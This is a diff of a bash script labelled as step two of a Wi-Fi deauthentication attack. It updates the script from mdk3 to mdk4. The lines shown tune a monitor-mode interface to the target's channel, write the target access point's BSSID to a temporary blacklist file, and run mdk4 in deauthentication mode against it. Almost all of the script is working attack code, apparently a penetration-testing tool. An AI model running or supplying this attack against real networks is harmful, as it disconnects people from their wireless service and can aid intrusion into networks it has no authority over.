@@ -1,8 +1,8 @@
 #!/bin/bash
-# Deauthentication Attack Step 2: Perform a Wi-Fi deauthentication attack on a WAP using mdk3
+# Deauthentication Attack Step 2: Perform a Wi-Fi deauthentication attack on a WAP using mdk4
 # Author: Alex Carbajal
 # Dependencies:
-# - https://salsa.debian.org/pkg-security-team/mdk3
+# - https://github.com/aircrack-ng/mdk4
 # - https://git.kernel.org/pub/scm/linux/kernel/git/jberg/iw.git
 # - https://github.com/BurntSushi/ripgrep
 
@@ -65,7 +65,7 @@ echo -e "Setting channel of ${BOLD}${INTERFACE_NAME_MONITOR}${NORMAL} to ${BOLD}
 iw dev "${INTERFACE_NAME_MONITOR}" set channel "${CHANNEL}"
 echo -e
 
-# Create a temporary file containing BSSID to run the deauthentication attack on (blacklist mode in mdk3)
+# Create a temporary file containing BSSID to run the deauthentication attack on (blacklist mode in mdk4)
 TMP_BLACKLIST_FILE=$(mktemp -t blacklist.XXXXXXXX)
 trap 'rm -f "$TMP_BLACKLIST_FILE"' EXIT # Auto-delete file on script exit
 echo "${BSSID}" >"${TMP_BLACKLIST_FILE}"
@@ -77,7 +77,7 @@ echo -e "Performing deauthentication attack on WAP ${BOLD}${BSSID}${NORMAL} usin
 echo -e "Press ${BOLD}Ctrl+C${NORMAL} to stop the attack"
 read -n 1 -s -r -p "Press any key to continue..."
 echo -e
-mdk3 "${INTERFACE_NAME_MONITOR}" d -b "${TMP_BLACKLIST_FILE}"
+mdk4 "${INTERFACE_NAME_MONITOR}" d -b "${TMP_BLACKLIST_FILE}"
 echo -e
 
 echo -e "${GREEN}Deauthentication attack executed. View data with ${BOLD}Wireshark${NORMAL}${GREEN}.${NORMAL}"
